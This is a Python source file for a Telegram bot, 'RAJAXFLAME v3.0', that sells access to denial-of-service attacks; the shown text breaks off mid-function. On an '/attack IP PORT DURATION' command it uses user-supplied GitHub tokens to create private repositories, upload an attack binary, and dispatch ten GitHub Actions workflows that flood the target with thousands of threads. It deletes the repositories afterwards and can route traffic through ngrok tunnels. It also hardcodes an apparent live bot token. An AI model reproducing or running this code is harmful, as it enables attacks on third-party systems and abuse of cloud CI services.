import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
    InputMediaPhoto,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ================ 🌟 CONFIGURATION 🌟 ================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8457763206:AAE_o4kb-RRjA0ChqVFHc8t_6Qd7vcHXo1A")
DEVELOPER_TAG = "@BITCH_lI_mBACK"
OWNER_IDS = {7848273230}

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
GITHUB_TOKENS_FILE = "github_tokens.txt"
NGROK_TOKENS_FILE = "ngrok_tokens.txt"
ATTACK_LOGS_FILE = "attack_logs.json"
TOKENS_STATUS_FILE = "tokens_status.json"
DEFAULT_THREADS_FILE = "threads.json"

BINARY_NAME = "rajaxflame"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)

# Tracking
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}
ACTIVE_TUNNELS: Dict[int, Any] = {}
ATTACK_LOGS: List[Dict[str, Any]] = []

# ================ 🎨 STYLISH DESIGN CONSTANTS 🎨 ================
BANNERS = {
    "welcome": """
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA INSTANT**      ║
║    💥 **10x WORKFLOWS**     ║
╚══════════════════════════════╝
    """,
    "attack_start": """
╔══════════════════════════════╗
║    🎯 **RAJAXFLAME FIRED**   ║
║    ⚡ **INSTANT STRIKE**     ║
║    🔥 **NGROK TUNNEL**      ║
╚══════════════════════════════╝
    """,
    "status": """
╔══════════════════════════════╗
║    📊 **RAJAXFLAME STATUS**  ║
║    🔥 **REAL-TIME**         ║
╚══════════════════════════════╝
    """,
    "control": """
╔══════════════════════════════╗
║    🎮 **RAJAXFLAME CONTROL** ║
║    ⚡ **FULL MANAGEMENT**    ║
╚══════════════════════════════╝
    """,
    "tunnel": """
╔══════════════════════════════╗
║    🌐 **TUNNEL STATUS**      ║
║    🔥 **COMPLETE REPORT**    ║
╚══════════════════════════════╝
    """
}

ANIME_PICS = [
    "https://wallpapercave.com/wp/wp13025001.jpg",
    "https://wallpapercave.com/wp/wp13024996.jpg",
    "https://wallpapercave.com/wp/wp13024994.jpg",
    "https://wallpapercave.com/wp/wp13024992.jpg"
]

# ================ 🔧 UTILITIES 🔧 ================
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

# ================ 🔐 TOKEN MANAGEMENT 🔐 ================
def save_github_token(uid: int, token: str) -> None:
    with open(GITHUB_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def save_ngrok_token(uid: int, token: str) -> None:
    with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_github_tokens() -> List[str]:
    if not os.path.exists(GITHUB_TOKENS_FILE):
        return []
    with open(GITHUB_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def load_ngrok_tokens() -> List[str]:
    if not os.path.exists(NGROK_TOKENS_FILE):
        return []
    with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def get_user_github_tokens(user_id: int) -> List[str]:
    return [ln.split(":", 1)[1] for ln in load_github_tokens() if ln.startswith(f"{user_id}:")]

def get_user_ngrok_tokens(user_id: int) -> List[str]:
    return [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]

def validate_github_token(token: str) -> bool:
    try:
        r = requests.get("https://api.github.com/user", headers=gh_headers(token), timeout=20)
        return r.status_code == 200
    except:
        return False

def validate_ngrok_token(token: str) -> bool:
    try:
        r = requests.get(
            "https://api.ngrok.com/credentials",
            headers=ngrok_headers(token),
            timeout=20
        )
        return r.status_code == 200
    except:
        return False

# ================ 🌐 GITHUB API FUNCTIONS 🌐 ================
def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.github.com/user/repos",
            headers=gh_headers(token),
            json={"name": name, "private": True, "auto_init": False},
            timeout=30
        )
        return r.json() if r.status_code in (201, 202) else None
    except:
        return None

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    try:
        b64 = base64.b64encode(content_bytes).decode()
        r = requests.put(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=gh_headers(token),
            json={"message": message, "content": b64},
            timeout=30
        )
        return r.status_code in (201, 200)
    except:
        return False

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    try:
        r = requests.post(
            f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
            headers=gh_headers(token),
            json={"ref": ref},
            timeout=30
        )
        return r.status_code in (204, 201)
    except:
        return False

def gh_delete_repo(token: str, full_name: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.github.com/repos/{full_name}",
            headers=gh_headers(token),
            timeout=30
        )
        return r.status_code == 204
    except:
        return False

# ================ 🔗 NGROK API FUNCTIONS 🔗 ================
def ngrok_headers(token: str) -> Dict[str, str]:
    return {
        "Authorization": f"Bearer {token}", 
        "Content-Type": "application/json",
        "Ngrok-Version": "2"
    }

def extract_tunnel_url(tunnel_data: Dict[str, Any]) -> str:
    """Extract tunnel URL with multiple fallbacks"""
    url_fields = ['public_url', 'uri', 'endpoint', 'tunnel_url', 'url', 'public_urls']
    
    for field in url_fields:
        if field in tunnel_data:
            url = tunnel_data[field]
            if url:
                if isinstance(url, str):
                    if 'ngrok.io' in url or 'ngrok-free.app' in url:
                        return url
                elif isinstance(url, list) and len(url) > 0:
                    return url[0]
    
    if 'endpoints' in tunnel_data and tunnel_data['endpoints']:
        return extract_tunnel_url(tunnel_data['endpoints'][0])
    
    return "tcp://ngrok.io:XXXXX (URL extracting...)"

def create_ngrok_tunnel(token: str, port: int = 80) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.ngrok.com/tunnels",
            headers=ngrok_headers(token),
            json={
                "name": f"rajaxflame-tunnel-{random.randint(1000,9999)}",
                "proto": "tcp",
                "addr": f"{port}",
                "metadata": f"rajaxflame-{int(time.time())}"
            },
            timeout=30
        )
        if r.status_code == 201:
            return r.json()
        else:
            return create_ngrok_tunnel_alternative(token, port)
    except Exception as e:
        logging.error(f"Ngrok tunnel creation error: {e}")
        return None

def create_ngrok_tunnel_alternative(token: str, port: int):
    """Alternative ngrok tunnel creation method"""
    try:
        r = requests.post(
            "https://api.ngrok.com/endpoints",
            headers=ngrok_headers(token),
            json={
                "description": f"rajaxflame-{int(time.time())}",
                "metadata": "rajaxflame-tunnel",
                "proto": "tcp",
                "addr": f"{port}"
            },
            timeout=30
        )
        return r.json() if r.status_code == 201 else None
    except Exception as e:
        logging.error(f"Alternative ngrok failed: {e}")
        return None

def delete_ngrok_tunnel(token: str, tunnel_id: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.ngrok.com/tunnels/{tunnel_id}",
            headers=ngrok_headers(token),
            timeout=20
        )
        return r.status_code == 204
    except:
        return False

# ================ ⚡ WORKFLOW BUILDERS ⚡ ================
def build_rajaxflame_workflows(ip: str, port: str, duration: str, threads: int) -> Dict[str, str]:
    workflows = {}
    main_wf = {
        "name": "🔥 RAJAXFLAME MAIN ATTACK",
        "on": {
            "workflow_dispatch": {},
            "push": {"branches": ["main"]}
        },
        "jobs": {
            "rajaxflame-massive": {
                "runs-on": "ubuntu-latest",
                "strategy": {
                    "fail-fast": False,
                    "matrix": {
                        "session": [1, 2, 3, 4, 5],
                        "include": [
                            {"session": 1, "threads": threads},
                            {"session": 2, "threads": threads},
                            {"session": 3, "threads": threads},
                            {"session": 4, "threads": threads},
                            {"session": 5, "threads": threads}
                        ]
                    }
                },
                "steps": [
                    {"name": "⚡ RAJAXFLAME Setup", "uses": "actions/checkout@v4"},
                    {"name": "🔧 Prepare Binary", "run": f"chmod +x {BINARY_NAME}"},
                    {"name": "🎯 Launch RAJAXFLAME", "run": f"./{BINARY_NAME} {ip} {port} {duration} ${{ matrix.threads }}"}
                ]
            }
        }
    }
    workflows["rajaxflame_main.yml"] = yaml.dump(main_wf, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    workflow_configs = {
        "rajaxflame_wave1.yml": {"name": "🔥 RAJAXFLAME WAVE 1", "threads": threads},
        "rajaxflame_wave2.yml": {"name": "⚡ RAJAXFLAME WAVE 2", "threads": threads + 1000},
        "rajaxflame_wave3.yml": {"name": "💥 RAJAXFLAME WAVE 3", "threads": threads + 2000},
        "rajaxflame_wave4.yml": {"name": "🚀 RAJAXFLAME WAVE 4", "threads": threads},
        "rajaxflame_wave5.yml": {"name": "🌪️ RAJAXFLAME WAVE 5", "threads": threads + 1500},
        "rajaxflame_wave6.yml": {"name": "🔥 RAJAXFLAME WAVE 6", "threads": threads},
        "rajaxflame_wave7.yml": {"name": "⚡ RAJAXFLAME WAVE 7", "threads": threads + 1000},
        "rajaxflame_wave8.yml": {"name": "💥 RAJAXFLAME WAVE 8", "threads": threads + 2500},
        "rajaxflame_ultimate.yml": {"name": "🎯 RAJAXFLAME ULTIMATE", "threads": threads + 3000}
    }
    
    for wf_file, config in workflow_configs.items():
        wf_config = {
            "name": config["name"],
            "on": {
                "workflow_dispatch": {},
                "push": {"branches": ["main"]}
            },
            "jobs": {
                "rajaxflame-attack": {
                    "runs-on": "ubuntu-latest",
                    "steps": [
                        {"name": "⚡ RAJAXFLAME Setup", "uses": "actions/checkout@v4"},
                        {"name": "🔧 Prepare Binary", "run": f"chmod +x {BINARY_NAME}"},
                        {"name": f"🎯 {config['name']}", "run": f"./{BINARY_NAME} {ip} {port} {duration} {config['threads']}"}
                    ]
                }
            }
        }
        workflows[wf_file] = yaml.dump(wf_config, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    return workflows

# ================ 🎭 ANIMATION & DESIGN 🎭 ================
async def send_rajaxflame_message(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error sending message: {e}")

async def send_rajaxflame_photo(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        profile_pic = random.choice(ANIME_PICS)
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=profile_pic,
            caption=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception:
        await send_rajaxflame_message(context, chat_id, text, banner_type, reply_markup)

async def animate_rajaxflame_progress(context, chat_id: int, duration: int):
    progress_bars = [
        "🟥⬜⬜⬜⬜⬜⬜⬜⬜⬜ 10%",
        "🟥🟥⬜⬜⬜⬜⬜⬜⬜⬜ 20%",
        "🟥🟥🟥⬜⬜⬜⬜⬜⬜⬜ 30%",
        "🟥🟥🟥🟥⬜⬜⬜⬜⬜⬜ 40%",
        "🟥🟥🟥🟥🟥⬜⬜⬜⬜⬜ 50%",
        "🟥🟥🟥🟥🟥🟥⬜⬜⬜⬜ 60%",
        "🟥🟥🟥🟥🟥🟥🟥⬜⬜⬜ 70%",
        "🟥🟥🟥🟥🟥🟥🟥🟥⬜⬜ 80%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥⬜ 90%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥 100%"
    ]
    msg = await context.bot.send_message(chat_id, "🔥 **RAJAXFLAME PROGRESS STARTING...**")
    interval = max(1, duration / len(progress_bars))
    for progress in progress_bars:
        await asyncio.sleep(interval)
        try:
            await msg.edit_text(f"⏳ **RAJAXFLAME PROGRESS:** {progress}")
        except Exception:
            pass
    return msg

# ================ 🎯 ATTACK HANDLER 🎯 ================
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_user_approved(user_id):
        await send_rajaxflame_message(
            context, chat_id,
            f"❌ **ACCESS DENIED**\n\nContact Developer: {DEVELOPER_TAG}",
            "status"
        )
        return
    
    if len(context.args) != 3:
        await send_rajaxflame_message(
            context, chat_id,
            "💡 **USAGE:** `/attack IP PORT DURATION`\n\nExample: `/attack 1.1.1.1 80 120`",
            "status"
        )
        return
    
    ip, port, duration = context.args
    try:
        port = int(port)
        duration = int(duration)
        if duration > 300:
            await update.message.reply_text("❌ Duration must be 300 seconds or less")
            return
    except ValueError:
        await update.message.reply_text("❌ PORT and DURATION must be valid numbers")
        return
    
    if not os.path.exists(BINARY_PATH):
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **BINARY MISSING**\n\nAdmin must upload binary via /file command",
            "status"
        )
        return
    
    github_tokens = get_user_github_tokens(user_id)
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    valid_github = [t for t in github_tokens if validate_github_token(t)]
    valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    if not valid_github:
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **NO VALID GITHUB TOKENS**\n\nUse /setgithub to add tokens first",
            "status"
        )
        return
    
    attack_msg = await update.message.reply_text("🔥 **INITIATING RAJAXFLAME ATTACK...**")
    
    tunnel_url = None
    tunnel_id = None
    if valid_ngrok:
        try:
            ngrok_token = random.choice(valid_ngrok)
            await attack_msg.edit_text("🔗 **CREATING RAJAXFLAME TUNNEL...**")
            tunnel_data = create_ngrok_tunnel(ngrok_token, port)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                if tunnel_url:
                    tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
                    ACTIVE_TUNNELS[chat_id] = {'data': tunnel_data, 'token': ngrok_token}
                    
                    # 🎯 IMMEDIATE TUNNEL STATUS UPDATE
                    tunnel_status_msg = f"""
🌐 **TUNNEL CREATED SUCCESSFULLY!**

🔗 **URL:** `{tunnel_url}`
🎯 **Target:** {ip}:{port}
⏰ **Created:** {datetime.utcnow().strftime('%H:%M:%S UTC')}
📊 **Status:** ✅ ACTIVE

💡 **Tunnel will auto-close after attack**
"""
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=tunnel_status_msg,
                        parse_mode='HTML'
                    )
                else:
                    await attack_msg.edit_text("⚠️ **Tunnel created but URL not found**")
            else:
                await attack_msg.edit_text("⚠️ **RAJAXFLAME TUNNEL CREATION FAILED**")
        except Exception as e:
            await attack_msg.edit_text(f"⚠️ **RAJAXFLAME TUNNEL FAILED:** {str(e)}")
    
    attack_target = tunnel_url if tunnel_url else ip
    target_port = "443" if tunnel_url else str(port)
    
    await attack_msg.edit_text("🔨 **BUILDING RAJAXFLAME WORKFLOWS...**")
    threads = get_default_threads()
    workflows = build_rajaxflame_workflows(attack_target, target_port, str(duration), threads)
    
    github_token = random.choice(valid_github)
    repo_name = f"rajaxflame-{random.randint(100000, 999999)}"
    
    await attack_msg.edit_text("📁 **CREATING RAJAXFLAME REPOSITORY...**")
    repo_data = gh_create_repo(github_token, repo_name)
    
    if not repo_data:
        await attack_msg.edit_text("❌ **FAILED TO CREATE RAJAXFLAME REPOSITORY**")
        return
    
    owner = repo_data['owner']['login']
    full_repo_name = repo_data['full_name']
    
    await attack_msg.edit_text("📦 **UPLOADING RAJAXFLAME BINARY...**")
    with open(BINARY_PATH, "rb") as f:
        binary_data = f.read()
    
    if not gh_put_file(github_token, owner, repo_name, BINARY_NAME, binary_data, "Add RAJAXFLAME binary"):
        await attack_msg.edit_text("❌ **FAILED TO UPLOAD RAJAXFLAME BINARY**")
        gh_delete_repo(github_token, full_repo_name)
        return
    
    await attack_msg.edit_text("⚡ **UPLOADING RAJAXFLAME WORKFLOWS...**")
    successful_workflows = 0
    for wf_name, wf_content in workflows.items():
        wf_path = f".github/workflows/{wf_name}"
        try:
            if gh_put_file(github_token, owner, repo_name, wf_path, wf_content.encode('utf-8'), f"Add {wf_name}"):
                successful_workflows += 1
            else:
                logging.error(f"Failed to upload {wf_name}")
        except Exception as e:
            logging.error(f"Error uploading {wf_name}: {str(e)}")
        await asyncio.sleep(0.5)
    
    await attack_msg.edit_text("🎯 **DEPLOYING RAJAXFLAME WORKFLOWS...**")
    dispatched_workflows = 0
    for wf_name in workflows.keys():
        try:
            if gh_dispatch_workflow(github_token, owner, repo_name, wf_name):
                dispatched_workflows += 1
            else:
                logging.error(f"Failed to dispatch {wf_name}")
        except Exception as e:
            logging.error(f"Error dispatching {wf_name}: {str(e)}")
        await asyncio.sleep(1)
    
    until_time = datetime.utcnow() + timedelta(seconds=duration + 30)
    ATTACK_STATUS[chat_id] = {
        "running": True,
        "until": until_time,
        "target": f"{attack_target}:{target_port}",
        "workflows_uploaded": successful_workflows,
        "workflows_dispatched": dispatched_workflows,
        "repo": full_repo_name,
        "start_time": datetime.utcnow().isoformat(),
        "github_token": github_token[:8] + "...",
        "tunnel_used": tunnel_url is not None,
        "tunnel_url": tunnel_url
    }
    
    ATTACK_LOGS.append({
        "user_id": user_id,
        "chat_id": chat_id,
        "target": f"{attack_target}:{target_port}",
        "duration": duration,
        "start_time": datetime.utcnow().isoformat(),
        "workflows": dispatched_workflows,
        "tunnel": tunnel_url
    })
    save_json(ATTACK_LOGS_FILE, ATTACK_LOGS)
    
    success_report = f"""
🎯 **RAJAXFLAME ATTACK DEPLOYED SUCCESSFULLY!**

📊 **RAJAXFLAME REPORT:**
✅ Workflows Uploaded: {successful_workflows}/10
✅ Workflows Deployed: {dispatched_workflows}/10
🎯 Target: `{attack_target}:{target_port}`
⏱ Duration: {duration} seconds
🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}

🔰 **MODE:** {'🔥 RAJAXFLAME TUNNEL + 10x WORKFLOWS' if tunnel_url else '⚡ RAJAXFLAME DIRECT + 10x WORKFLOWS'}
📁 Repository: `{repo_name}`
🔑 Token: `{github_token[:12]}...`

💥 **RAJAXFLAME ACTIVATED - TARGET WILL BE BLASTED!**
    """
    
    await attack_msg.delete()
    await send_rajaxflame_photo(context, chat_id, success_report, "attack_start")
    
    asyncio.create_task(animate_rajaxflame_progress(context, chat_id, duration))
    asyncio.create_task(rajaxflame_cleanup(chat_id, github_token, full_repo_name, tunnel_id, duration))

async def rajaxflame_cleanup(chat_id: int, token: str, repo: str, tunnel_id: Optional[str], duration: int):
    await asyncio.sleep(duration + 10)
    try:
        gh_delete_repo(token, repo)
    except Exception:
        pass
    if tunnel_id and chat_id in ACTIVE_TUNNELS:
        try:
            ngrok_token = ACTIVE_TUNNELS[chat_id]['token']
            delete_ngrok_tunnel(ngrok_token, tunnel_id)
            del ACTIVE_TUNNELS[chat_id]
        except Exception:
            pass
    if chat_id in ATTACK_STATUS:
        ATTACK_STATUS[chat_id]["running"] = False

# ================ 🎪 COMMAND HANDLERS 🎪 ================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    welcome_text = f"""
✨ **WELCOME TO RAJAXFLAME v3.0** ✨

👤 **User:** {user.first_name}
🆔 **ID:** `{user.id}`
🔰 **Status:** {'✅ APPROVED' if is_user_approved(user.id) else '❌ PENDING'}

🔥 **RAJAXFLAME FEATURES:**
• Instant 10x Workflows Attack
• Ngrok Tunnel Integration
• Professional UI/UX Design
• Real-time Status Updates
• Advanced Token Management

📚 **RAJAXFLAME Commands:**
/setgithub - Add GitHub Tokens
/setngrok - Add Ngrok Tokens
/attack - Launch RAJAXFLAME Attack
/status - Detailed Status Report
/tunnelstatus - Tunnel Status Report
/mytunnels - Your Active Tunnels
/control - Admin Control Panel
/logs - View Attack Logs

👨‍💻 **Developer:** {DEVELOPER_TAG}
    """
    await send_rajaxflame_photo(context, chat_id, welcome_text, "welcome")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🔥 **RAJAXFLAME v3.0 - COMMAND GUIDE**

🔹 **User Commands**
/start - Welcome message and bot info
/help - Show this command guide
/attack IP PORT DURATION - Launch instant attack
/status - View attack, user, and token status
/tunnelstatus - Detailed tunnel status
/mytunnels - Show your active tunnels
/setgithub - Add GitHub Personal Access Tokens
/setngrok - Add Ngrok Auth Tokens
/check - Validate GitHub and Ngrok tokens

🔹 **Admin Commands**
/control - Open admin control panel
/logs - View recent attack logs
/add USERID DAYS - Approve user
/remove USERID - Remove user
/threads NUMBER - Set default threads
/file - Upload rajaxflame binary
/stop - Stop ongoing attack

🔹 **Owner Commands**
/addadmin USERID - Add admin
/removeadmin USERID - Remove admin

👨‍💻 **Contact:** {DEVELOPER_TAG}
"""
    await send_rajaxflame_message(context, update.effective_chat.id, help_text, "welcome")

async def cmd_setgithub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        file = await update.message.document.get_file()
        path = await file.download_to_drive()
        count = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                token = line.strip()
                if token and len(token) > 10:
                    save_github_token(user_id, token)
                    count += 1
        os.remove(path)
        await update.message.reply_text(f"✅ **RAJAXFLAME SAVED {count} GITHUB TOKENS**")
    else:
        text = update.message.text.replace("/setgithub", "").strip()
        if not text:
            await update.message.reply_text("💡 **Send GitHub PAT tokens or upload .txt file**")
            return
        tokens = [t.strip() for t in text.split() if t.strip()]
        for token in tokens:
            save_github_token(user_id, token)
        await update.message.reply_text(f"✅ **RAJAXFLAME SAVED {len(tokens)} GITHUB TOKENS**")

async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.replace("/setngrok", "").strip()
    if not text:
        await update.message.reply_text("💡 **Send Ngrok auth token**")
        return
    save_ngrok_token(user_id, text)
    await update.message.reply_text("✅ **RAJAXFLAME NGROK TOKEN SAVED**")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    status = ATTACK_STATUS.get(chat_id, {})
    users = get_users()
    github_tokens = get_user_github_tokens(user_id)
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    # 🎯 TUNNEL STATUS CHECK
    tunnel_status = "❌ **NO ACTIVE TUNNEL**"
    if chat_id in ACTIVE_TUNNELS:
        tunnel_data = ACTIVE_TUNNELS[chat_id]['data']
        tunnel_url = extract_tunnel_url(tunnel_data)
        if tunnel_url:
            tunnel_status = f"✅ **ACTIVE TUNNEL**\n🔗 `{tunnel_url}`"
        else:
            tunnel_status = f"🟡 **TUNNEL CREATED**\n📊 Data: `{str(tunnel_data)[:50]}...`"
    
    status_text = f"""
🎯 **ATTACK STATUS:**
{'🔥 **ACTIVE ATTACK**' if status.get("running") else '💤 **NO ACTIVE ATTACK**'}

🌐 **TUNNEL STATUS:**
{tunnel_status}

📊 **TOKEN STATUS:**
🔑 GitHub: {len([t for t in github_tokens if validate_github_token(t)])}/{len(github_tokens)} ✅
🌐 Ngrok: {len([t for t in ngrok_tokens if validate_ngrok_token(t)])}/{len(ngrok_tokens)} ✅

👤 **USER STATUS:**
{'✅ APPROVED' if is_user_approved(user_id) else '❌ PENDING'}
{'👑 OWNER' if is_owner(user_id) else '🛡️ ADMIN' if is_admin(user_id) else '👤 USER'}
"""
    
    # 🎯 ACTIVE ATTACK DETAILS
    if status.get("running"):
        time_left = status["until"] - datetime.utcnow()
        status_text += f"""
⚡ **ATTACK DETAILS:**
🎯 Target: `{status['target']}`
🕒 Started: {status['start_time'][11:19]} UTC
⏱ Time Left: {max(0, int(time_left.total_seconds()))}s
📁 Repository: `{status['repo'].split('/')[-1]}`
🔑 GitHub Token: `{status['github_token']}`
🔗 Tunnel Used: {'✅ YES' if status['tunnel_used'] else '❌ NO'}
📈 Workflows: {status['workflows_dispatched']}/10
"""
    
    # 🎯 AVAILABLE TUNNELS COUNT
    active_tunnels_count = len(ACTIVE_TUNNELS)
    status_text += f"\n🔗 **Active Tunnels:** {active_tunnels_count}"
    
    await send_rajaxflame_message(context, chat_id, status_text, "status")

async def cmd_tunnel_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detailed tunnel status only"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    tunnel_text = ""
    
    # 🎯 CURRENT CHAT TUNNEL
    if chat_id in ACTIVE_TUNNELS:
        tunnel_data = ACTIVE_TUNNELS[chat_id]['data']
        tunnel_url = extract_tunnel_url(tunnel_data)
        
        tunnel_text += f"""
🎯 **YOUR ACTIVE TUNNEL:**
🔗 URL: `{tunnel_url}`
🆔 ID: `{tunnel_data.get('id', 'N/A')}`
📊 Status: `{tunnel_data.get('status', 'active')}`
⏰ Created: Recently
🔑 Token: `{ACTIVE_TUNNELS[chat_id]['token'][:12]}...`
"""
    else:
        tunnel_text += """
❌ **NO ACTIVE TUNNEL**

💡 **To create tunnel:**
Use `/attack IP PORT TIME` command
Tunnel automatically banega jab attack start hoga
"""
    
    # 🎯 USER'S NGROK TOKENS STATUS
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    if ngrok_tokens:
        valid_tokens = [t for t in ngrok_tokens if validate_ngrok_token(t)]
        tunnel_text += f"""
🔑 **YOUR NGROK TOKENS:**
✅ Valid: {len(valid_tokens)}
📜 Total: {len(ngrok_tokens)}
🟢 Ready: {'YES' if valid_tokens else 'NO'}
"""
    else:
        tunnel_text += """
❌ **NO NGROK TOKENS FOUND**

💡 **Add tokens using:**
/setngrok YOUR_NGROK_TOKEN
"""
    
    # 🎯 GLOBAL TUNNELS STATS
    active_tunnels_count = len(ACTIVE_TUNNELS)
    tunnel_text += f"""
🌐 **GLOBAL TUNNELS:**
🔗 Active: {active_tunnels_count}
👥 Users: {len(set(ACTIVE_TUNNELS.keys()))}
"""
    
    await send_rajaxflame_message(context, chat_id, tunnel_text, "tunnel")

async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all active tunnels for user"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Find all tunnels for this user (simplified - using chat_id as proxy)
    user_tunnels = []
    for cid, tunnel_info in ACTIVE_TUNNELS.items():
        user_tunnels.append((cid, tunnel_info))
    
    if not user_tunnels:
        await update.message.reply_text("""
🌐 **NO ACTIVE TUNNELS**

💡 Your tunnels will appear here when you start attacks with /attack command
""")
        return
    
    tunnels_text = f"""
📊 **Total Active:** {len(user_tunnels)}
"""
    
    for i, (cid, tunnel_info) in enumerate(user_tunnels, 1):
        tunnel_url = extract_tunnel_url(tunnel_info['data'])
        tunnels_text += f"""
🔗 **Tunnel {i}:**
🌐 URL: `{tunnel_url}`
💬 Chat: {cid}
⏰ Status: ✅ ACTIVE
"""
    
    await send_rajaxflame_message(context, chat_id, tunnels_text, "tunnel")

async def cmd_tunnel_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test ngrok tunnel functionality"""
    user_id = update.effective_user.id
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    if not ngrok_tokens:
        await update.message.reply_text("❌ **No ngrok tokens found**")
        return
    
    msg = await update.message.reply_text("🔍 **Testing ngrok tokens...**")
    
    results = []
    for i, token in enumerate(ngrok_tokens, 1):
        await msg.edit_text(f"🔍 Testing token {i}/{len(ngrok_tokens)}...")
        
        # Validate token
        is_valid = validate_ngrok_token(token)
        status = "✅ Valid" if is_valid else "❌ Invalid"
        
        # Test tunnel creation
        tunnel_data = None
        if is_valid:
